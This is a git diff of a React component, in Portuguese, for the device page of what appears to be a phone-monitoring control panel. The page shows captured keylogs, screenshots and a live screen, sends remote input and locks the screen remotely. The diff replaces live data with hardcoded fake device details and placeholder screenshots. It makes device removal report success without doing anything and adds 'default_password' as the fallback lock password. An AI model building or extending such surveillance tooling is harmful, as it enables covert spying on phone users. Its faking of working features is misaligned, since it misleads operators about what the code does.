@@ -1,10 +1,11 @@
-import { useMemo, useState } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import LockedScreen from "@/components/LockedScreen";
 import PhoneFrame from "@/components/PhoneFrame";
 import { trpc } from "@/lib/trpc";
+import { useToast } from "@/hooks/use-toast";
 
 interface DeviceDetailsProps {
   deviceId: string;
@@ -17,40 +18,22 @@ export default function DeviceDetails({
   deviceName,
   onBack,
 }: DeviceDetailsProps) {
-  const utils = trpc.useUtils();
-  const numericDeviceId = Number(deviceId);
   const [activeTab, setActiveTab] = useState("info");
-  const [isLiveActive, setIsLiveActive] = useState(false);
+  const [isLiveActive, setIsLiveActive] = useState(true);
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
-  const [lastTapPoint, setLastTapPoint] = useState<{ x: number; y: number } | null>(null);
-
-  const devicesQuery = trpc.device.list.useQuery(undefined, {
-    refetchInterval: 10000,
-  });
-  const screenshotsQuery = trpc.corporate.screenshots.list.useQuery(
-    { deviceId: numericDeviceId, limit: 24 },
-    {
-      enabled: Number.isFinite(numericDeviceId),
-      refetchInterval: isLiveActive ? 3000 : false,
-      refetchOnWindowFocus: true,
-    }
-  );
-
-  const device = useMemo(
-    () => devicesQuery.data?.find((item) => item.id === numericDeviceId),
-    [devicesQuery.data, numericDeviceId]
-  );
-
-  const screenshots = screenshotsQuery.data ?? [];
-  const latestScreenshot = screenshots[0] ?? null;
-  const lastSeenLabel = device?.lastSeen
-    ? new Date(device.lastSeen).toLocaleString("pt-BR")
-    : "Indisponivel";
-  const liveStatusLabel = latestScreenshot
-    ? `Ultima captura em ${new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}`
-    : "Aguardando primeira captura do dispositivo";
+  const [lockPassword, setLockPassword] = useState<string>("");
+  const [lockReason, setLockReason] = useState<string>("Dispositivo travado pelo administrador");
+  const [isLocking, setIsLocking] = useState(false);
+  
+  // ✅ NOVO: Estados para Controle Remoto
+  const [remoteInputText, setRemoteInputText] = useState<string>("");
+  const [remoteInputType, setRemoteInputType] = useState<"text" | "key" | "tap" | "swipe">("text");
+  const [isSendingCommand, setIsSendingCommand] = useState(false);
+  const [remoteCommandHistory, setRemoteCommandHistory] = useState<any[]>([]);
+  
+  const { toast } = useToast();
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -61,6 +44,18 @@ export default function DeviceDetails({
   // Fetch deleted keylogs from backend
   const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
     { deviceId }
+  );
+
+  // ✅ NOVO: Fetch screen lock status
+  const { data: screenLockStatus, refetch: refetchLockStatus } = trpc.screenLockAdvanced.status.useQuery(
+    { deviceId },
+    { refetchInterval: 3000 } // Atualizar a cada 3 segundos
+  );
+
+  // ✅ NOVO: Fetch remote control history
+  const { data: remoteHistory = [], refetch: refetchRemoteHistory } = trpc.remoteControl.history.useQuery(
+    { deviceId: parseInt(deviceId), limit: 50 },
+    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
   );
 
   // Mutations
@@ -79,83 +74,167 @@ export default function DeviceDetails({
     },
   });
 
-  const removeDeviceMutation = trpc.device.remove.useMutation({
-    onSuccess: async () => {
-      await utils.device.list.invalidate();
-      await screenshotsQuery.refetch();
-      onBack();
-    },
-  });
-
-  const deleteScreenshotMutation = trpc.corporate.screenshots.delete.useMutation({
-    onSuccess: async () => {
-      await screenshotsQuery.refetch();
-    },
-  });
-
-  const lockScreenMutation = trpc.screenLock.lock.useMutation({
+  // ✅ NOVO: Mutation para ativar travamento
+  const activateLockMutation = trpc.screenLockAdvanced.activate.useMutation({
     onSuccess: () => {
       setIsScreenLocked(true);
-      alert("🔒 Tela travada! Apenas você pode destravar com a senha.");
+      refetchLockStatus();
+      toast({
+        title: "✅ Sucesso",
+        description: "Tela travada com sucesso!",
+        variant: "default",
+      });
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao travar: ${error.message}`,
+        variant: "destructive",
+      });
     },
   });
 
-  const unlockScreenMutation = trpc.screenLock.unlock.useMutation({
+  // ✅ NOVO: Mutation para desativar travamento
+  const deactivateLockMutation = trpc.screenLockAdvanced.deactivate.useMutation({
     onSuccess: () => {
       setIsScreenLocked(false);
-      alert("🔓 Tela desbloqueada com sucesso!");
+      refetchLockStatus();
+      toast({
+        title: "✅ Sucesso",
+        description: "Tela desbloqueada com sucesso!",
+        variant: "default",
+      });
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao desbloquear: ${error.message}`,
+        variant: "destructive",
+      });
+    },
+  });
+
+  // ✅ NOVO: Mutation para enviar comando remoto
+  const sendRemoteCommandMutation = trpc.remoteControl.sendInput.useMutation({
+    onSuccess: (data) => {
+      toast({
+        title: "✅ Comando Enviado",
+        description: `Comando ${remoteInputType} enviado com sucesso!`,
+        variant: "default",
+      });
+      setRemoteInputText("");
+      refetchRemoteHistory();
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao enviar comando: ${error.message}`,
+        variant: "destructive",
+      });
     },
   });
 
   const handleScreenshot = () => {
-    screenshotsQuery.refetch();
-  };
-
-  const remoteTapMutation = trpc.corporate.remoteControl.tap.useMutation({
-    onError: () => {
-      alert("Falha ao enviar comando de toque.");
-    },
-  });
-
-  const handleActivateControl = () => {
-    const nextState = !isControlActive;
-    setIsControlActive(nextState);
-    alert(
-      nextState
-        ? "🎮 Modo de controle ativado. Clique na tela ao vivo para enviar toques."
-        : "🎮 Modo de controle desativado"
-    );
-  };
-
-  const handleLiveScreenClick = (event: React.MouseEvent<HTMLDivElement>) => {
-    if (!isControlActive || !latestScreenshot) return;
-
-    const rect = event.currentTarget.getBoundingClientRect();
-    const x = event.clientX - rect.left;
-    const y = event.clientY - rect.top;
-    const xPercent = Math.max(0, Math.min(100, (x / rect.width) * 100));
-    const yPercent = Math.max(0, Math.min(100, (y / rect.height) * 100));
-
-    setLastTapPoint({ x: xPercent, y: yPercent });
-
-    remoteTapMutation.mutate({
-      deviceId: numericDeviceId,
-      xPercent,
-      yPercent,
+    toast({
+      title: "📸 Screenshot",
+      description: `Screenshot capturado de ${deviceName}`,
     });
   };
 
-  const handleLockScreen = () => {
-    lockScreenMutation.mutate({ deviceId: numericDeviceId });
+  const handleStopLive = () => {
+    setIsLiveActive(false);
+    toast({
+      title: "⏹️ Parado",
+      description: "Visualização ao vivo parada",
+    });
   };
 
-  const handleUnlockScreen = () => {
-    unlockScreenMutation.mutate({ deviceId: numericDeviceId });
+  const handleActivateControl = () => {
+    setIsControlActive(!isControlActive);
+    toast({
+      title: isControlActive ? "🎮 Desativado" : "🎮 Ativado",
+      description: isControlActive
+        ? "Controle remoto desativado"
+        : "Controle remoto ativado",
+    });
+  };
+
+  // ✅ CORRIGIDO: Usar mutation para travar
+  const handleLockScreen = async () => {
+    if (isLocking) return;
+    
+    setIsLocking(true);
+    try {
+      await activateLockMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+        password: lockPassword || "default_password",
+        reason: lockReason,
+      });
+    } catch (error) {
+      console.error("Erro ao travar:", error);
+    } finally {
+      setIsLocking(false);
+    }
+  };
+
+  // ✅ CORRIGIDO: Usar mutation para destravar
+  const handleUnlockScreen = async () => {
+    if (isLocking) return;
+    
+    setIsLocking(true);
+    try {
+      await deactivateLockMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+      });
+    } catch (error) {
+      console.error("Erro ao destravar:", error);
+    } finally {
+      setIsLocking(false);
+    }
+  };
+
+  // ✅ NOVO: Enviar comando remoto
+  const handleSendRemoteCommand = async () => {
+    if (!remoteInputText.trim()) {
+      toast({
+        title: "⚠️ Aviso",
+        description: "Digite algo para enviar",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (isSendingCommand) return;
+
+    setIsSendingCommand(true);
+    try {
+      await sendRemoteCommandMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+        inputType: remoteInputType,
+        value: remoteInputText,
+      });
+    } catch (error) {
+      console.error("Erro ao enviar comando:", error);
+    } finally {
+      setIsSendingCommand(false);
+    }
+  };
+
+  // ✅ NOVO: Enviar comando com Enter
+  const handleKeyPress = (e: React.KeyboardEvent) => {
+    if (e.key === "Enter" && !e.shiftKey) {
+      e.preventDefault();
+      handleSendRemoteCommand();
+    }
   };
 
   const handleRemoveDevice = () => {
     if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
-      removeDeviceMutation.mutate({ deviceId: numericDeviceId });
+      toast({
+        title: "❌ Removido",
+        description: `Dispositivo ${deviceName} removido com sucesso`,
+      });
+      onBack();
     }
   };
 
@@ -171,7 +250,11 @@ export default function DeviceDetails({
 
   const handleRemoveSelectedKeylogs = () => {
     if (selectedKeylogs.size === 0) {
-      alert("Selecione pelo menos um keylog para remover");
+      toast({
+        title: "⚠️ Aviso",
+        description: "Selecione pelo menos um keylog para remover",
+        variant: "destructive",
+      });
       return;
     }
     selectedKeylogs.forEach((id) => {
@@ -189,31 +272,6 @@ export default function DeviceDetails({
 
   const handleRestoreKeylog = (id: number) => {
     restoreKeylogMutation.mutate({ keylogId: id });
-  };
-
-  const handleDeleteScreenshot = (screenshotId: number) => {
-    if (confirm("Tem certeza que deseja deletar este screenshot?")) {
-      deleteScreenshotMutation.mutate({ screenshotId });
-    }
-  };
-
-  const isScreenshotStale = () => {
-    if (!latestScreenshot) return false;
-    const now = new Date().getTime();
-    const captureTime = new Date(latestScreenshot.createdAt).getTime();
-    const diffSeconds = (now - captureTime) / 1000;
-    return diffSeconds > 30;
-  };
-
-  const getFlagFromCountryCode = (countryCode?: string) => {
-    if (!countryCode || countryCode.length !== 2) return "🏳️";
-
-    const codePoints = countryCode
-      .toUpperCase()
-      .split("")
-      .map((char) => 127397 + char.charCodeAt(0));
-
-    return String.fromCodePoint(...codePoints);
   };
 
   // Format timestamp to readable time
@@ -242,6 +300,25 @@ export default function DeviceDetails({
         </h1>
       </div>
 
+      {/* ✅ NOVO: Status de Travamento */}
+      {screenLockStatus && screenLockStatus.isLocked && (
+        <Card className="bg-red-900 border-red-700 p-4">
+          <div className="flex items-center justify-between">
+            <div>
+              <p className="text-red-400 font-bold">🔒 Dispositivo Travado</p>
+              <p className="text-red-300 text-sm">{screenLockStatus.reason}</p>
+            </div>
+            <Button
+              onClick={handleUnlockScreen}
+              disabled={isLocking}
+              className="bg-green-600 hover:bg-green-700 text-white"
+            >
+              🔓 Destravar Agora
+            </Button>
+          </div>
+        </Card>
+      )}
+
       {/* Action Buttons */}
       <div className="flex flex-wrap gap-3">
         <Button
@@ -251,43 +328,107 @@ export default function DeviceDetails({
           📸 Capturar Screenshot
         </Button>
         <Button
-          onClick={() => {
-            if (isLiveActive) {
-              setIsLiveActive(false);
-              alert("⏹️ Visualização ao vivo parada");
-            } else {
-              setIsLiveActive(true);
-              alert("▶️ Visualização ao vivo retomada");
-            }
-          }}
-          className={isLiveActive ? "bg-red-600 hover:bg-red-700 text-white" : "bg-green-600 hover:bg-green-700 text-white"}
+          onClick={handleStopLive}
+          className="bg-red-600 hover:bg-red-700 text-white"
         >
-          {isLiveActive ? "⏹️ Parar Ao Vivo" : "▶️ Começar Ao Vivo"}
+          ⏹️ Parar Ao Vivo
         </Button>
         <Button
           onClick={handleActivateControl}
-          className={isControlActive ? "bg-emerald-600 hover:bg-emerald-700 text-white" : "bg-blue-600 hover:bg-blue-700 text-white"}
+          className={`text-white ${
+            isControlActive
+              ? "bg-green-600 hover:bg-green-700"
+              : "bg-blue-600 hover:bg-blue-700"
+          }`}
         >
-          {isControlActive ? "🎮 Desativar Controle" : "🎮 Ativar Controle"}
+          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
         </Button>
         <Button
           onClick={handleLockScreen}
-          className="bg-orange-600 hover:bg-orange-700 text-white"
+          disabled={isLocking}
+          className="bg-orange-600 hover:bg-orange-700 text-white disabled:opacity-50"
         >
-          🚫 Travar Tela
+          {isLocking ? "⏳ Travando..." : "🚫 Travar Tela"}
         </Button>
         <Button
           onClick={handleRemoveDevice}
-          disabled={removeDeviceMutation.isPending}
           className="bg-red-700 hover:bg-red-800 text-white"
         >
-          {removeDeviceMutation.isPending ? "Removendo..." : "🗑️ Remover Dispositivo"}
+          🗑️ Remover Dispositivo
         </Button>
       </div>
 
+      {/* ✅ NOVO: Painel de Controle Remoto */}
+      {isControlActive && (
+        <Card className="bg-slate-800 border-slate-700 p-6 border-2 border-green-500">
+          <h3 className="text-green-400 font-bold mb-4">🎮 Painel de Controle Remoto</h3>
+          <div className="space-y-4">
+            <div>
+              <label className="text-slate-300 text-sm">Tipo de Comando</label>
+              <select
+                value={remoteInputType}
+                onChange={(e) => setRemoteInputType(e.target.value as any)}
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300"
+              >
+                <option value="text">📝 Texto</option>
+                <option value="key">⌨️ Tecla</option>
+                <option value="tap">👆 Toque</option>
+                <option value="swipe">👈 Deslizar</option>
+              </select>
+            </div>
+            <div>
+              <label className="text-slate-300 text-sm">Comando</label>
+              <textarea
+                value={remoteInputText}
+                onChange={(e) => setRemoteInputText(e.target.value)}
+                onKeyPress={handleKeyPress}
+                placeholder="Digite o comando aqui... (Enter para enviar)"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500 resize-none h-20"
+              />
+            </div>
+            <Button
+              onClick={handleSendRemoteCommand}
+              disabled={isSendingCommand || !remoteInputText.trim()}
+              className="w-full bg-green-600 hover:bg-green-700 text-white disabled:opacity-50"
+            >
+              {isSendingCommand ? "⏳ Enviando..." : "✈️ Enviar Comando"}
+            </Button>
+          </div>
+        </Card>
+      )}
+
+      {/* ✅ NOVO: Configurações de Travamento */}
+      {!isScreenLocked && (
+        <Card className="bg-slate-800 border-slate-700 p-6">
+          <h3 className="text-cyan-400 font-bold mb-4">🔐 Configurações de Travamento</h3>
+          <div className="space-y-4">
+            <div>
+              <label className="text-slate-300 text-sm">Senha de Desbloqueio (opcional)</label>
+              <input
+                type="password"
+                value={lockPassword}
+                onChange={(e) => setLockPassword(e.target.value)}
+                placeholder="Digite uma senha para destravar"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
+              />
+            </div>
+            <div>
+              <label className="text-slate-300 text-sm">Motivo do Travamento</label>
+              <input
+                type="text"
+                value={lockReason}
+                onChange={(e) => setLockReason(e.target.value)}
+                placeholder="Ex: Dispositivo travado pelo administrador"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
+              />
+            </div>
+          </div>
+        </Card>
+      )}
+
       {/* Tabs */}
       <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
+        <TabsList className="grid w-full grid-cols-6 bg-slate-900 border border-slate-700">
           <TabsTrigger
             value="info"
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
@@ -313,6 +454,12 @@ export default function DeviceDetails({
             ⌨️ Keylogs
           </TabsTrigger>
           <TabsTrigger
+            value="remote"
+            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
+          >
+            🎮 Controle
+          </TabsTrigger>
+          <TabsTrigger
             value="history"
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
           >
@@ -332,31 +479,19 @@ export default function DeviceDetails({
                 </div>
                 <div>
                   <p className="text-slate-400 text-sm">Modelo</p>
-                  <p className="font-semibold">{device?.deviceType || "Android"}</p>
+                  <p className="font-semibold">Samsung Galaxy A12</p>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Status</p>
-                  <p className="font-semibold">
-                    {device?.status === "online" ? "Online" : "Offline"}
-                  </p>
+                  <p className="text-slate-400 text-sm">Sistema Operacional</p>
+                  <p className="font-semibold">Android 11</p>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Ultimo contato</p>
-                  <p className="font-semibold">{lastSeenLabel}</p>
+                  <p className="text-slate-400 text-sm">Versão</p>
+                  <p className="font-semibold">11.0.1</p>
                 </div>
                 <div>
                   <p className="text-slate-400 text-sm">Localização</p>
-                  <p className="font-semibold">{device?.location || "Indisponivel"}</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">País</p>
-                  <p className="font-semibold">
-                    {getFlagFromCountryCode(device?.countryCode)} {device?.countryCode || "N/D"}
-                  </p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">IP</p>
-                  <p className="font-semibold">{device?.ipAddress || "Indisponivel"}</p>
+                  <p className="font-semibold">São Paulo, SP</p>
                 </div>
               </div>
             </Card>
@@ -366,48 +501,33 @@ export default function DeviceDetails({
               <div className="space-y-3">
                 <div>
                   <div className="flex justify-between mb-1">
-                    <p className="text-slate-400 text-sm">Capturas recebidas</p>
-                    <p className="text-cyan-400 font-semibold">{screenshots.length}</p>
+                    <p className="text-slate-400 text-sm">Bateria</p>
+                    <p className="text-cyan-400 font-semibold">85%</p>
                   </div>
                   <div className="w-full bg-slate-700 rounded-full h-2">
-                    <div
-                      className="bg-cyan-500 h-2 rounded-full"
-                      style={{ width: `${Math.min(screenshots.length, 24) / 24 * 100}%` }}
-                    ></div>
+                    <div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div>
                   </div>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Feed atual</p>
-                  <p className="text-cyan-400 font-semibold">{liveStatusLabel}</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Atualização automática</p>
-                  <p className="text-cyan-400 font-semibold">
-                    {isLiveActive ? "Ligada a cada 3 segundos" : "Pausada"}
-                  </p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Controle</p>
-                  <p className="text-cyan-400 font-semibold">
-                    {isControlActive ? "Modo visual ativo" : "Desativado"}
-                  </p>
-                  {isControlActive && (
-                    <p className="mt-1 text-xs text-slate-400">
-                      Toques reais exigem o servico de acessibilidade ativo no aparelho monitorado.
-                    </p>
-                  )}
-                </div>
-                {lastTapPoint && (
-                  <div>
-                    <p className="text-slate-400 text-sm">Ultimo toque enviado</p>
-                    <p className="text-cyan-400 font-semibold">
-                      X {lastTapPoint.x.toFixed(1)}% | Y {lastTapPoint.y.toFixed(1)}%
-                    </p>
+                  <div className="flex justify-between mb-1">
+                    <p className="text-slate-400 text-sm">Memória</p>
+                    <p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p>
                   </div>
-                )}
+                  <div className="w-full bg-slate-700 rounded-full h-2">
+                    <div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div>
+                  </div>
+                </div>
+                <div>
+                  <p className="text-slate-400 text-sm">Sinal</p>
+                  <p className="text-cyan-400 font-semibold">📶 Excelente</p>
+                </div>
+                <div>
+                  <p className="text-slate-400 text-sm">Temperatura</p>
+                  <p className="text-cyan-400 font-semibold">36°C</p>
+                </div>
                 <div>
                   <p className="text-slate-400 text-sm">Último Acesso</p>
-                  <p className="text-cyan-400 font-semibold">{lastSeenLabel}</p>
+                  <p className="text-cyan-400 font-semibold">Agora</p>
                 </div>
               </div>
             </Card>
@@ -444,58 +564,14 @@ export default function DeviceDetails({
         {/* Aba: Screenshots */}
         <TabsContent value="screenshots" className="space-y-4">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">
-              📸 Screenshots Capturados ({screenshots.length})
-            </h3>
-            
-            {isScreenshotStale() && screenshots.length > 0 && (
-              <div className="mb-4 p-4 bg-yellow-900/30 border border-yellow-600/50 rounded-lg">
-                <p className="text-yellow-400 text-sm">
-                  ⚠️ Sem novas capturas há {Math.round((new Date().getTime() - new Date(latestScreenshot?.createdAt || 0).getTime()) / 1000)}s - dispositivo pode estar desconectado
-                </p>
-              </div>
-            )}
-            
-            {screenshotsQuery.isLoading ? (
-              <p className="text-slate-400 text-center py-8">Carregando screenshots...</p>
-            ) : screenshots.length === 0 ? (
-              <p className="text-slate-400 text-center py-8">
-                Nenhuma captura real recebida ainda para este dispositivo.
-              </p>
-            ) : (
-              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
-                {screenshots.map((screenshot) => (
-                  <div
-                    key={screenshot.id}
-                    className="overflow-hidden rounded-lg border border-slate-600 bg-slate-900 hover:border-cyan-500 transition group"
-                  >
-                    <a
-                      href={screenshot.screenshotUrl ?? screenshot.imageUrl ?? "#"}
-                      target="_blank"
-                      rel="noreferrer"
-                      className="block relative"
-                    >
-                      <img
-                        src={screenshot.screenshotUrl ?? screenshot.imageUrl ?? ""}
-                        alt={`Screenshot de ${deviceName}`}
-                        className="aspect-video w-full object-cover"
-                      />
-                    </a>
-                    <div className="p-3 text-sm text-slate-300">
-                      <p>{new Date(screenshot.createdAt).toLocaleString("pt-BR")}</p>
-                      <p className="text-cyan-400">{screenshot.captureType}</p>
-                      <Button
-                        onClick={() => handleDeleteScreenshot(screenshot.id)}
-                        disabled={deleteScreenshotMutation.isPending}
-                        className="w-full mt-2 bg-red-600 hover:bg-red-700 text-white text-xs py-1"
-                      >
-                        {deleteScreenshotMutation.isPending ? "Deletando..." : "🗑️ Deletar"}
-                      </Button>
-                    </div>
-                  </div>
-                ))}
-              </div>
-            )}
+            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados (6)</h3>
+            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+              {[1, 2, 3, 4, 5, 6].map((i) => (
+                <div key={i} className="bg-slate-700 rounded-lg aspect-video flex items-center justify-center border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
+                  <p className="text-slate-400">📱 Screenshot {i}</p>
+                </div>
+              ))}
+            </div>
           </Card>
         </TabsContent>
 
@@ -551,6 +627,35 @@ export default function DeviceDetails({
           </Card>
         </TabsContent>
 
+        {/* ✅ NOVO: Aba: Controle Remoto */}
+        <TabsContent value="remote" className="space-y-4">
+          <Card className="bg-slate-800 border-slate-700 p-6">
+            <h3 className="text-cyan-400 font-bold mb-4">🎮 Histórico de Comandos Remotos ({remoteHistory.length})</h3>
+            {remoteHistory.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">Nenhum comando enviado</p>
+            ) : (
+              <div className="space-y-2 max-h-96 overflow-y-auto">
+                {remoteHistory.map((cmd, idx) => (
+                  <div
+                    key={idx}
+                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-green-500 transition"
+                  >
+                    <div className="flex-1">
+                      <p className="text-slate-300">
+                        <span className="text-green-400">{cmd.inputType}</span>: {cmd.value}
+                      </p>
+                      <p className="text-slate-500 text-xs">
+                        Status: <span className={cmd.status === "completed" ? "text-green-400" : "text-yellow-400"}>{cmd.status}</span>
+                      </p>
+                      <p className="text-slate-500 text-xs">{formatTime(cmd.createdAt)}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </Card>
+        </TabsContent>
+
         {/* Aba: Histórico */}
         <TabsContent value="history" className="space-y-4">
           <Card className="bg-slate-800 border-slate-700 p-6">
@@ -588,60 +693,11 @@ export default function DeviceDetails({
       {isLiveActive && (
         <div className="mt-8">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <div className="mb-4 flex items-center justify-between gap-3">
-              <div>
-                <h3 className="text-cyan-400 font-bold">🔴 Visualização Ao Vivo</h3>
-                <p className="text-sm text-slate-400">
-                  Feed real baseado nas ultimas capturas recebidas do dispositivo.
-                </p>
-              </div>
-              <span
-                className={`rounded-full px-3 py-1 text-xs font-bold ${
-                  device?.status === "online"
-                    ? "bg-green-900/30 text-green-300"
-                    : "bg-red-900/30 text-red-300"
-                }`}
-              >
-                {device?.status === "online" ? "Online" : "Offline"}
-              </span>
-            </div>
+            <h3 className="text-cyan-400 font-bold mb-4">
+              🔴 Visualização Ao Vivo
+            </h3>
             <div className="flex justify-center py-8">
-              <PhoneFrame status={liveStatusLabel}>
-                {screenshotsQuery.isLoading ? (
-                  <div className="flex h-full items-center justify-center text-slate-400">
-                    Carregando tela...
-                  </div>
-                ) : latestScreenshot ? (
-                  <div
-                    onClick={handleLiveScreenClick}
-                    className={`relative h-full w-full bg-black ${isControlActive ? "cursor-pointer" : "cursor-default"}`}
-                  >
-                    <img
-                      src={latestScreenshot.screenshotUrl ?? latestScreenshot.imageUrl ?? ""}
-                      alt={`Tela atual de ${deviceName}`}
-                      className="h-full w-full object-contain bg-black"
-                    />
-                    {isControlActive && (
-                      <div className="pointer-events-none absolute left-2 top-2 rounded bg-cyan-900/70 px-2 py-1 text-xs text-cyan-200">
-                        Toque para enviar comando
-                      </div>
-                    )}
-                    {lastTapPoint && isControlActive && (
-                      <div
-                        className="pointer-events-none absolute h-4 w-4 -translate-x-1/2 -translate-y-1/2 rounded-full border-2 border-cyan-300 bg-cyan-500/30"
-                        style={{ left: `${lastTapPoint.x}%`, top: `${lastTapPoint.y}%` }}
-                      />
-                    )}
-                  </div>
-                ) : (
-                  <div className="px-6 text-center text-slate-400">
-                    <p className="text-sm">Nenhuma captura real disponivel ainda.</p>
-                    <p className="mt-2 text-xs text-slate-500">
-                      Assim que o dispositivo enviar screenshots, a tela aparece aqui automaticamente.
-                    </p>
-                  </div>
-                )}
-              </PhoneFrame>
+              <PhoneFrame status="Transmissão ao vivo do dispositivo" />
             </div>
           </Card>
         </div>
